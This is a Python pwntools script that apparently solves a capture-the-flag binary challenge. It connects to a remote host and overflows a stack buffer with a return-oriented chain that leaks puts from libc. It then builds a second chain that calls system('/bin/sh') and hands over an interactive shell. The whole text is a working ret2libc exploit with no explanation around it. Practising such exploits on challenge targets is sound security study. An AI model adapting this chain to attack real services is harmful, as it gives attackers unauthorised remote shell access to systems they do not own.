from pwn import *

# p = process("./chall")
p = remote("103.167.132.234", 31776)

# context.log_level = 'debug'

libc = ELF('./libc6_2.36-9+deb12u1_amd64.so')

pop_rdi = 0x00000000004011ea
puts_got = 0x403fc0
puts_plt = 0x0000000000401030
main = 0x00000000004012f0
ret = 0x0000000000401016

payload = b'a'*120
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(b'a')
p.sendline(payload)
p.recvuntil(b'CBY{FAKE_FLAG}\n')

leak_puts = p.recvline().strip()
log.info(f"Len rop1: {len(leak_puts)}")
leak_puts = u64(leak_puts.ljust(8, b"\x00"))

print(hex(leak_puts))
libc.address = leak_puts - libc.sym['puts']
str_bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

newpayload = b'a'*120
newpayload += p64(ret)
newpayload += p64(pop_rdi)
newpayload += p64(str_bin_sh) 
newpayload += p64(system)

p.sendline(b'\x90')
p.sendline(newpayload)
p.interactive()